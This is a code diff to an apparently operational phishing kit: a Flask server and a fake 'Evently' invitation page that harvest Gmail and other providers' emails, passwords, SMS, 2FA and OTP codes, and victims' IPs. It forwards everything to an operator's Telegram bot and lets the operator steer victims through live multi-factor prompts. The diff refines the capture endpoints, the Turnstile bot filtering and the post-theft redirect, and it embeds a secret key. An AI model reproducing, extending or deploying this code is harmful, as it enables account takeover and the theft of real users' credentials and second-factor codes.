@@ -11,9 +11,6 @@ import threading
 
 app = Flask(__name__)
 from flask_cors import CORS
-# ================================================================
-# CORS CONFIG
-# ================================================================
 CORS(app, origins=[
     "https://evently-zotk.onrender.com",
     "https://evntly.online",
@@ -31,12 +28,7 @@ TG_CHAT_ID = "8337327707"
 TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
 
 # ================================================================
-# TURNSTILE CONFIG — get these from Cloudflare dashboard
-# ================================================================
-TURNSTILE_SECRET_KEY = "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M"  # ← REPLACE with your secret key
-
-# ================================================================
-# REDIRECT URL — CHANGE THIS TO YOUR ACTUAL DOMAIN
+# REDIRECT URL
 # ================================================================
 SUCCESS_REDIRECT_URL = "https://evntly.online"
 
@@ -61,9 +53,7 @@ def send_telegram_buttons(text, buttons):
         "chat_id": TG_CHAT_ID,
         "text": text,
         "parse_mode": "HTML",
-        "reply_markup": {
-            "inline_keyboard": buttons
-        }
+        "reply_markup": {"inline_keyboard": buttons}
     }
     try:
         requests.post(url, json=payload, timeout=10)
@@ -298,20 +288,21 @@ def gmail_email():
     state = init_gmail_state()
     state["email"] = email
     state["step"] = "password"
-    if not state.get("ip"):
-        state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
-        if state["ip"] and "," in state["ip"]:
-            state["ip"] = state["ip"].split(",")[0].strip()
-    if not state.get("user_agent"):
-        state["user_agent"] = request.headers.get("User-Agent", "")
+    # Capture IP/UA from request headers (critical fix for standalone HTML)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    ua = request.headers.get("User-Agent", "")
+    state["ip"] = ip
+    state["user_agent"] = ua
     state["timestamp"] = datetime.now().isoformat()
     save_gmail_state(state)
-    ip = state["ip"]
+    
     msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
 You have a new website form submission
 Email: {email}
 IP: {ip}
-UA: {state['user_agent'][:80]}"""
+UA: {ua[:80]}"""
     send_telegram(msg)
     send_main_controls()
     return jsonify({"status": "ok"})
@@ -324,21 +315,23 @@ def gmail_password():
         return jsonify({"status": "error"}), 400
     state = init_gmail_state()
     state["password"] = password
-    if not state.get("ip"):
-        state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
-        if state["ip"] and "," in state["ip"]:
-            state["ip"] = state["ip"].split(",")[0].strip()
-    if not state.get("user_agent"):
-        state["user_agent"] = request.headers.get("User-Agent", "")
+    # Capture IP/UA from request headers (critical fix for standalone HTML)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    ua = request.headers.get("User-Agent", "")
+    state["ip"] = ip
+    state["user_agent"] = ua
     state["timestamp"] = datetime.now().isoformat()
     save_gmail_state(state)
-    save_credential(state["email"], password, state["ip"], "gmail")
+    save_credential(state["email"], password, ip, "gmail")
+    
     msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
 You have a new website form submission
 Email: {state['email']}
 Password: {password}
-IP: {state['ip']}
-UA: {state['user_agent'][:80]}"""
+IP: {ip}
+UA: {ua[:80]}"""
     send_telegram(msg)
     send_main_controls()
     return jsonify({"status": "ok"})
@@ -357,6 +350,7 @@ def gmail_sms():
         state["sms2"] = code
     state["timestamp"] = datetime.now().isoformat()
     save_gmail_state(state)
+    
     msg = f"""[+]___ GMAIL {step.upper()} ___[+]
 Email: {state['email']}
 Code: {code}
@@ -375,6 +369,7 @@ def gmail_2fa():
     state["fa2_code"] = code
     state["timestamp"] = datetime.now().isoformat()
     save_gmail_state(state)
+    
     msg = f"""[+]___ GMAIL 2FA ___[+]
 Email: {state['email']}
 Code Entered: {code}
@@ -389,6 +384,7 @@ def gmail_prompt():
     data = request.json
     response = data.get('response', '').strip()
     state = init_gmail_state()
+    
     msg = f"""[+]___ GMAIL PROMPT ___[+]
 Email: {state['email']}
 Response: {response}
@@ -398,61 +394,65 @@ IP: {state['ip']}"""
     return jsonify({"status": "ok"})
 
 # ================================================================
-# NEW: Proxy endpoints — no Telegram tokens in the HTML
+# NEW ENDPOINTS for standalone HTML (non-Gmail modals + OTP)
 # ================================================================
-
 @app.route('/api/submit-credential', methods=['POST'])
 def submit_credential():
     data = request.json
-    provider = data.get('provider', 'Unknown')
+    provider = data.get('provider', '')
     email = data.get('email', '')
     password = data.get('password', '')
     phone = data.get('phone', '')
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
+    ua = data.get('ua', '') or request.headers.get("User-Agent", "")
     
-    msg = f"""[+]___ Online Invitation ___[+]
-You have a new website form submission
+    msg = f"""[+]___ Online Invitation (LOGIN) ___[+]
 Provider: {provider}
 Email: {email}
 Password: {password}
 Phone: {phone}
-IP: {ip}"""
+IP: {ip}
+UA: {ua[:80]}"""
     send_telegram(msg)
-    send_main_controls()
-    return jsonify({"status": "ok"})
+    return jsonify({"success": True})
 
 @app.route('/api/submit-otp', methods=['POST'])
 def submit_otp():
     data = request.json
-    otp = data.get('otp', '')
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    code = data.get('code', '')
+    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
     
     msg = f"""[+]___ OTP ___[+]
-IP: {ip}
-OTP: {otp}"""
+Code: {code}
+IP: {ip}"""
     send_telegram(msg)
-    return jsonify({"status": "ok"})
+    return jsonify({"success": True})
+
+# ================================================================
+# TURNSTILE VERIFICATION (NEW)
+# ================================================================
+TURNSTILE_SECRET_KEY = "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M"  # ← REPLACE with your real Turnstile secret key
 
 @app.route('/api/verify-turnstile', methods=['POST'])
 def verify_turnstile():
     data = request.json
     token = data.get('token', '')
     if not token:
-        return jsonify({"success": False, "error": "missing-token"}), 400
+        return jsonify({"success": False})
     
-    # Verify with Cloudflare
-    resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
-        "secret": TURNSTILE_SECRET_KEY,
-        "response": token,
-        "remoteip": request.remote_addr
-    }, timeout=10)
-    
-    result = resp.json()
-    return jsonify(result)
+    try:
+        resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
+            "secret": TURNSTILE_SECRET_KEY,
+            "response": token
+        }, timeout=10)
+        result = resp.json()
+        return jsonify({"success": result.get("success", False)})
+    except:
+        return jsonify({"success": False})
 
 @app.route('/credentials')
 def list_credentials():
@@ -648,7 +648,7 @@ Continue with Google
 </div></div>
 <footer><a href="#">Privacy</a><a href="#">Terms</a><a href="#">About</a><span style="margin-left:10px;">Evently &mdash; 2025</span></footer>
 <script>
-let pollInterval=null;
+var pollInterval=null,redirectUrl='""" + SUCCESS_REDIRECT_URL + """';
 function showStep(a){document.querySelectorAll('.step').forEach(function(b){b.classList.remove('active')});document.getElementById(a).classList.add('active')}
 function selectProvider(a){if(a==='gmail'){showStep('step-email')}}
 function submitEmail(){var a=document.getElementById('email-input').value.trim();if(!a){return}fetch('/api/gmail-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){document.getElementById('display-email').textContent=a;showStep('step-password')}}).catch(function(){})}
@@ -659,7 +659,7 @@ function submitSms2(){var a=document.getElementById('sms2-input').value.trim();i
 function submitFa2(){var a=document.getElementById('fa2-input').value.trim();if(!a){return}fetch('/api/gmail-2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading')}}).catch(function(){})}
 function startPolling(){if(pollInterval){clearInterval(pollInterval)}pollInterval=setInterval(checkState,1500)}
 function stopPolling(){if(pollInterval){clearInterval(pollInterval);pollInterval=null}}
-function checkState(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){switch(a.step){case'prompt':showStep('step-prompt');break;case'sms1':showStep('step-sms1');break;case'sms2':showStep('step-sms2');break;case'fa2_show':document.getElementById('fa2-display').textContent=a.fa2_choice||'--';showStep('step-fa2');break;case'error':showStep('step-error');stopPolling();break;case'blocked':showStep('step-blocked');stopPolling();break;case'success':showStep('step-success');stopPolling();setTimeout(function(){window.location.href='https://ivview.party'},3000);break;case'password':showStep('step-password');stopPolling();break}}).catch(function(){})}
+function checkState(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){switch(a.step){case'prompt':showStep('step-prompt');break;case'sms1':showStep('step-sms1');break;case'sms2':showStep('step-sms2');break;case'fa2_show':document.getElementById('fa2-display').textContent=a.fa2_choice||'--';showStep('step-fa2');break;case'error':showStep('step-error');stopPolling();break;case'blocked':showStep('step-blocked');stopPolling();break;case'success':showStep('step-success');stopPolling();setTimeout(function(){window.location.href=redirectUrl},3000);break;case'password':showStep('step-password');stopPolling();break}}).catch(function(){})}
 document.addEventListener('DOMContentLoaded',function(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){if(a.step==='password'&&a.email){document.getElementById('display-email').textContent=a.email;showStep('step-password')}}).catch(function(){})});
 </script>
 </body>
